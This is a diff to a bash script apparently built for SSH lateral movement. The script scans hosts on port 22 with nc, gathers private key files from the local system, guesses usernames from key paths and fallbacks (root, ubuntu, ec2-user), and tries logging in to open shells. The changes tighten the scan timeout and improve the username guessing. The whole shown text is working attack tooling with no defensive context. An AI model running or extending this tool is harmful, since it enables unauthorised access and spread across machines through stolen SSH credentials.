@@ -10,7 +10,7 @@ PORTS=(22)                       # ports to scan; add 2222 etc. if needed
 SSH_USER_GUESSES=(root ubuntu ec2-user)  # fallbacks if username isn’t encoded in key path
 COMMAND_TO_RUN=                  # e.g. "whoami"; leave blank for full shell
 SCREEN_SESSION=ssh_hop
-SCAN_TIMEOUT=2                   # seconds nc waits on each host:port
+SCAN_TIMEOUT=1                   # seconds nc waits on each host:port
 KEY_FIND_TIMEOUT=40              # overall limit for grep search
 
 ##############################################################################
@@ -89,8 +89,16 @@ attempt_login() {                # $1=host $2=key $3=username
 for host in "${OPEN_HOSTS[@]}"; do
   for key in "${KEY_FILES[@]}"; do
     # crude username guess based on key path; fallbacks in list
-    user_guess=${key##*/}           # filename
-    user_guess=${user_guess%%_*}    # e.g. id_rsa_ec2-user -> id
+    # -------- pick a first-guess username from the key path --------
+    if [[ $key == /home/*/.ssh/* ]]; then            #  /home/<user>/.ssh/<file>
+        user_guess=${key#/home/}                     # strip leading “/home/”
+        user_guess=${user_guess%%/*}                 # keep text up to first /
+    elif [[ $key == /root/* ]]; then                 #  /root/…
+        user_guess=root
+    else                                             # fall back to filename heuristics
+        user_guess=$(basename "$key")                # e.g.  id_rsa_ec2-user
+        user_guess=${user_guess%%_*}                 # -> id
+    fi
     for user in "$user_guess" "${SSH_USER_GUESSES[@]}"; do
       log "🔑  Trying $key → $user@$host ..."
       if attempt_login "$host" "$key" "$user"; then
